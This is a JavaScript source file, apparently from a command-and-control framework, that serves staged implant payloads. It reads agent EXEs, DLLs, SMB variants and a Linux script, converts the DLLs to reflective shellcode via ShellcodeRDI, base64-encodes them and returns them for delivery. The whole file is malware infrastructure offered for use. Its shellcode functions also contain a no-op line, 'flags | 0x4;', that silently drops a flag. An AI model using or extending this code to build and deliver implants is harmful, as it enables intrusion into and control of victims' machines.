import fs from 'fs';
import * as ShellcodeRDI from '../modules/ShellcodeRDI';

export default class Download {
	constructor() {
		this.downloads = {
		'agent32exe':this.download_agent32_exe,
		'agent64exe':this.download_agent64_exe,
		'agent32dll':this.download_agent32_dll,
		'agent64dll':this.download_agent64_dll,
		'agent32exesmb':this.download_agent32_exe_smb,
		'agent64exesmb':this.download_agent64_exe_smb,
		'agent32dllsmb':this.download_agent32_dll_smb,
		'agent64dllsmb':this.download_agent64_dll_smb,
		'agent32sh': this.download_agent32_shellcode,
		'agent64sh': this.download_agent64_shellcode,
		'agent32shsmb': this.download_agent32_shellcode_smb,
		'agent64shsmb': this.download_agent64_shellcode_smb,
		'agentlinux':this.download_agent_linux
		}
	}

	download_agent32_exe() {
		var contents = fs.readFileSync('data/agents_staged/AgentEXE32.exe');
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent64_exe() {
		var contents = fs.readFileSync('data/agents_staged/AgentEXE.exe');
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent32_dll() {
		var contents = fs.readFileSync('data/agents_staged/AgentDLL32.dll');
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent64_dll() {
		var contents = fs.readFileSync('data/agents_staged/AgentDLL.dll');
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent32_exe_smb() {
		var contents = fs.readFileSync('data/agents_staged/AgentSMB32.exe');
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent64_exe_smb() {
		var contents = fs.readFileSync('data/agents_staged/AgentSMB.exe');
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent32_dll_smb() {
		var contents = fs.readFileSync('data/agents_staged/AgentSMB32.dll');
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent64_dll_smb() {
		var contents = fs.readFileSync('data/agents_staged/AgentSMB.dll');
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent32_shellcode() {
		let flags = 0;
		flags |= 0x1;
		flags | 0x4;
		const buff = fs.readFileSync('data/agents_staged/AgentDLL32.dll');
		const arrayBuff = buff.buffer.slice(buff.byteOffset, buff.byteOffset + buff.byteLength);
		var contents = ShellcodeRDI.ConvertToShellcode(arrayBuff,ShellcodeRDI.HashFunctionName("main"),undefined,flags);
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent64_shellcode() {
		let flags = 0;
		flags |= 0x1;
		flags | 0x4;
		const buff = fs.readFileSync('data/agents_staged/AgentDLL.dll');
		const arrayBuff = buff.buffer.slice(buff.byteOffset, buff.byteOffset + buff.byteLength);
		var contents = ShellcodeRDI.ConvertToShellcode(arrayBuff,ShellcodeRDI.HashFunctionName("main"),undefined,flags);
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent32_shellcode_smb() {
		let flags = 0;
		flags |= 0x1;
		flags | 0x4;
		const buff = fs.readFileSync('data/agents_staged/AgentDLL32SMB.dll');
		const arrayBuff = buff.buffer.slice(buff.byteOffset, buff.byteOffset + buff.byteLength);
		var contents = ShellcodeRDI.ConvertToShellcode(arrayBuff,ShellcodeRDI.HashFunctionName("main"),undefined,flags);
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent64_shellcode_smb() {
		let flags = 0;
		flags |= 0x1;
		flags | 0x4;
		const buff = fs.readFileSync('data/agents_staged/AgentDLLSMB.dll');
		const arrayBuff = buff.buffer.slice(buff.byteOffset, buff.byteOffset + buff.byteLength);
		var contents = ShellcodeRDI.ConvertToShellcode(arrayBuff,ShellcodeRDI.HashFunctionName("main"),undefined,flags);
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	download_agent_linux() {
		var contents = fs.readFileSync('data/agents_staged/run.py');
		contents = Buffer.from(contents).toString('base64');
		return {'agentData':contents};
	}

	getState() {
		return {};
	}

	postUpdate(data) {
		var type = data['type'];
		var name = data['name'];
		var returnData = this.downloads[type]();
		returnData['agentName'] = name;
		returnData['send'] = 'self';
		return returnData;
	}
}
